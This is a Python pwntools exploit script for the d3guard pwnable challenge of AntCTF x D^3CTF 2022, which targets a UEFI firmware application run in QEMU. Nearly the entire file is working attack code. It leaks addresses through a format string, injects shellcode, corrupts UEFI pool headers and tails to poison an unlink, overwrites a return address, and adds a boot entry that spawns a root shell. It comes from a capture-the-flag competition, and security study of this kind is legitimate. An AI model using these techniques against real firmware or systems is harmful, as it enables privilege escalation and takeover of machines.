#!/usr/bin/python3
# ************************************************ #
# AntCTF x D^3CTF 2022                             #
# Type: Pwnable                                    #
# Chall: d3guard                                   #
# Author: Eqqie (https://github.com/yikesoftware/) #
# ************************************************ #
from pwn import *
import os
import sys
import random

context.arch = "amd64"
remote_addr = ("1-lb-pwn-challenge-cluster.d3ctf.io", 32659)
test_token = b"Sdtwx24ticC608cDjeeK35700MgHXh5D"

if len(sys.argv) != 2:
    print("python3 exp.py <remote-socat|remote-debug|remote-nodebug|local-socat|local-nodebug|local-debug>")
    sys.exit(0)
mode = sys.argv[1]
# remote
if mode == "remote-socat":
    os.system("clear")
    os.system(
        f"socat $(tty),echo=0,escape=0x03 SYSTEM:\"python3 {__file__} remote-nodebug\" 2>&1")
    sys.exit(0)
elif mode == "remote-debug":
    context.log_level = "debug"
    do_proof = True
    p = remote(remote_addr[0], remote_addr[1])
elif mode == "remote-nodebug":
    do_proof = True
    p = remote(remote_addr[0], remote_addr[1])
# lcoal
elif mode == "local-socat":
    os.system("cp OVMF.fd.bak OVMF.fd")
    os.system(
        f"socat $(tty),echo=0,escape=0x03 SYSTEM:\"python3 {__file__} local-nodebug\" 2>&1")
elif mode == "local-debug":
    do_proof = False
    os.system("cp OVMF.fd.bak OVMF.fd")
    p = process([
        "qemu-system-x86_64",
        "-s",
        "-m", f"{256+random.randint(0, 512)}",
        "-drive", "if=pflash,format=raw,file=OVMF.fd",
        "-drive", "file=fat:rw:contents,format=raw",
        "-net", "none",
        "-nographic"
    ])
elif mode == "local-nodebug":
    do_proof = False
    os.system("cp OVMF.fd.bak OVMF.fd")
    p = process([
        "qemu-system-x86_64",
        "-m", f"{256+random.randint(0, 512)}",
        "-drive", "if=pflash,format=raw,file=OVMF.fd",
        "-drive", "file=fat:rw:contents,format=raw",
        "-net", "none",
        "-monitor", "/dev/null",
        "-nographic"
    ])


def new_visitor(_id: int, name, desc):
    p.sendafter(b">> ", b"1\r")
    p.sendafter(b"ID: ", str(_id).encode()+b"\r")
    p.sendafter(b"Name: ", name+b"\r")
    p.sendafter(b"Desc: ", desc+b"\r")


def edit(target, content):
    p.sendafter(b">> ", b"2\r")
    if target == 1 or target == "name":
        p.sendafter(b">> ", b"1\r")
        p.sendafter(b"Name: ", content+b"\r")
    if target == 2 or target == "desc":
        p.sendafter(b">> ", b"2\r")
        p.sendafter(b"Desc: ", content+b"\r")


def clear():
    p.sendafter(b">> ", b"3\r")


key_map = {
    "up":    b"\x1b[A",
    "down":  b"\x1b[B",
    "left":  b"\x1b[D",
    "right": b"\x1b[C",
    "esc":   b"\x1b^[",
    "enter": b"\r",
    "tab":   b"\t"
}


def send_key(_key: str, times: int = 1):
    for _ in range(times):
        p.send(key_map[_key])


def exp():
    # team token
    if do_proof:
        print("test_token:", test_token)
        p.sendlineafter(b"Input your team token:", test_token)

    # into 'UiAPP'
    p.recv(1)
    p.send(b'\x1b[24~'*20)

    # leak image_addr & stack_addr
    p.sendafter(b"Visitor): ", b"1\r")
    p.sendafter(b"Username: ",
                b"|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p\r")
    p.recvuntil(b"User [")
    for _ in range(5):
        p.recvuntil(b"|")
    stack_leak = int(p.recvuntil(b"|", drop=True).decode(), 16)
    print(hex(stack_leak))
    for _ in range(11):
        p.recvuntil(b"|")
    image_leak = int(p.recvuntil(b"|", drop=True).decode(), 16)
    print(hex(image_leak))

    # raw_input()

    app_base = image_leak-0x173f5

    # write null-off shellcode
    p.sendafter(b"Visitor): ", b"1\r")
    p.sendafter(b"Username: ", b"Admin\r")
    shellcode = asm('''
    jmp JUMP;
    .byte 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90;
    .byte 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90;
    JUMP:
        mov rax, r15;
        mov rbx, 0x1461e11;
        shr rbx, 8;
        sub rax, rbx;
        jmp rax;
    ''')
    # .text:00000000000003EC                 call    sha256_update
    # break here to check rdi value
    # b *(-0x173f5+0x3EC)
    # raw_input()

    p.sendafter(b"Pass key: ", shellcode+b"\r")

    # raw_input()
    '''
    leak - real
    >>> hex(0x282bebd2-0x282ae6cf)
    '0x10503'
    '''

    # into visitor system
    p.sendafter(b"Visitor): ", b"2\r")

    # .data:00000000000208E0 visitor         dq 0
    # 

    # new
    new_visitor(1, b"yama", b"a")

    # raw_input()
    '''
    gdb-peda$ x/90gx 0x000000002a552018
    0x2a552018:     0x0000000000000001      0x000000002a552f18
    0x2a552028:     0x000000002a552f98      0xafafafaf6c617470

    gdb-peda$ x/90gx 0x000000002a552f18-0x10
    0x2a552f08:     0x0000000000000000      0x0000000000000040
    0x2a552f18:     0xafafaf00616d6179      0xafafafafafafafaf data[0x18]
    0x2a552f28:     0xafafafafafafafaf      0xafafafaf6c617470 ptal
    0x2a552f38:     0x0000000000000040      0xafafafafafafafaf
    0x2a552f48:     0xafafafafafafafaf      0xafafafafafafafaf
    0x2a552f58:     0xafafafafafafafaf      0xafafafafafafafaf
    0x2a552f68:     0xafafafafafafafaf      0xafafafafafafafaf
    0x2a552f78:     0xafafafafafafafaf      0x0000000030646870 phd0
    0x2a552f88:     0x0000000000000000      0x0000000000000060
    0x2a552f98:     0xafafafafafaf0061      0xafafafafafafafaf data[0x38]
    0x2a552fa8:     0xafafafafafafafaf      0xafafafafafafafaf
    0x2a552fb8:     0xafafafafafafafaf      0xafafafafafafafaf
    0x2a552fc8:     0xafafafafafafafaf      0xafafafaf6c617470 ptal
    0x2a552fd8:     0x0000000000000060      0xafafafafafafafaf
    0x2a552fe8:     0xafafafafafafafaf      0xafafafafafafafaf
    0x2a552ff8:     0xafafafafafafafaf      0x000000002a559a9d
    0x2a553008:     0xafafafafafafafaf      0xafafafafafafafaf
    0x2a553018:     0xafafafafafafafaf      0xafafafafafafafaf
    '''

    clear()
    edit("name", b"yama")
    edit("desc", b"aaa")

    # raw_input()
    '''
    gdb-peda$ x/90gx 0x0000000018352f18-0x10
    0x18352f08:     0x0000000000000000      0x0000000000000060 desc
    0x18352f18:     0xafafafaf00616161      0xafafafafafafafaf
    0x18352f28:     0xafafafafafafafaf      0xafafafafafafafaf
    0x18352f38:     0xafafafafafafafaf      0xafafafafafafafaf
    0x18352f48:     0xafafafafafafafaf      0xafafafaf6c617470 ptal
    0x18352f58:     0x0000000000000060      0xafafafafafafafaf
    0x18352f68:     0xafafafafafafafaf      0xafafafafafafafaf
    0x18352f78:     0xafafafafafafafaf      0x0000000030646870 phd0
    0x18352f88:     0x0000000000000000      0x0000000000000040
    0x18352f98:     0xafafaf00616d6179      0xafafafafafafafaf yama
    0x18352fa8:     0xafafafafafafafaf      0xafafafaf6c617470
    0x18352fb8:     0x0000000000000040      0xafafafafafafafaf
    0x18352fc8:     0xafafafafafafafaf      0xafafafafafafafaf
    0x18352fd8:     0xafafafafafafafaf      0xafafafafafafafaf
    0x18352fe8:     0xafafafafafafafaf      0xafafafafafafafaf
    0x18352ff8:     0xafafafafafafafaf      0x0000000018359a9d
    0x18353008:     0xafafafafafafafaf      0xafafafafafafafaf
    0x18353018:     0xafafafafafafafaf      0xafafafafafafafaf
    '''
    
    
    # modify POOL_HEAD.Type
    # part3
    part3 = b""
    part3 += p64(0x40)[0:7]  # POOL_HEAD.Size
    edit("desc", b"\xaf"*(0x7f-len(part3))+part3)
    # part2
    part2 = b""
    part2 += b"\xaf"*0x20  # pad
    part2 += p32(0x30646870)  # POOL_HEAD.Signature
    part2 += b"\xaf\xaf\xaf\xaf"  # POOL_HEAD.Reserved
    part2 += p8(10)  # POOL_HEAD.Type (EfiACPIMemoryNVS)
    # write 0xaf
    for i in range(6, -1, -1):
        tmp = part2+b"\xaf"*i
        edit("desc", b"\xaf"*(0x7f-len(part3)-len(part2)-7)+tmp)
    # part1
    part1 = b""
    part1 = part1.ljust(0x38, b"\xaf")
    part1 += b"ptal"  # POOL_TAIL.Signature
    part1 += b"\xaf"*4  # POOL_TAIL.Reserved
    part1 += p8(0x60)  # POOL_TAIL.Size
    for i in range(6, -1, -1):
        tmp = part1+b"\xaf"*i
        edit("desc", b"\xaf"*(0x7f-len(part3)-len(part2)-7-len(part1)-7)+tmp)
    # Put 'name' into other free list
    clear()

    # poison unlink
    edit("desc", b"aaa")
    edit("name", b"eqqie")
    clear()
    edit("desc", b"bbb")
    edit("name", b"eqqie")

    # x/10gx *(-0x173f5+0x208E0)
    # raw_input()
    

    # calc addr
    ret_addr = stack_leak-0x104ba
    stack_shellcode = ret_addr-0x49
    # part4(BK)
    part4 = p32(ret_addr)
    edit("desc", b"\xaf"*0x78+part4)
    # part3(FD)
    part3 = p32(stack_shellcode)
    for i in range(3, -1, -1):
        tmp = part3+b"\xaf"*i
        edit("desc", b"\xaf"*0x70+tmp)
    # part2
    part2 = b"pfr0"
    for i in range(3, -1, -1):
        tmp = part2+b"\xaf"*i
        edit("desc", b"\xaf"*0x68+tmp)
    # part1
    part1 = b"\xaf"*0x38
    part1 += b"ptal"+b"\xaf"*4
    part1 += p8(0x60)
    for i in range(6, -1, -1):
        tmp = part1+b"\xaf"*i
        edit("desc", tmp)

    # return to UiAPP
    p.sendafter(b">> ", b"4\r")
    print("app_base:", hex(app_base))
    print("ret_addr:", hex(ret_addr))
    print("stack_shellcode:", hex(stack_shellcode))

    p.send(b"\r")

    # Add new boot option
    p.recvuntil(b"Standard PC")
    send_key("down", 3)
    send_key("enter")
    send_key("enter")
    send_key("down")
    send_key("enter")
    send_key("enter")
    send_key("down", 3)
    send_key("enter")
    p.send(b"\rrootshell\r")
    send_key("down")
    p.send(b"\rconsole=ttyS0 initrd=rootfs.img rdinit=/bin/sh quiet\r")
    send_key("down")
    send_key("enter")
    send_key("up")
    send_key("enter")
    send_key("esc")
    send_key("enter")
    send_key("down", 3)
    send_key("enter")

    # root shell
    # p.sendlineafter(b"/ #", b"cat /flag")
    p.interactive()


if __name__ == "__main__":
    exp()
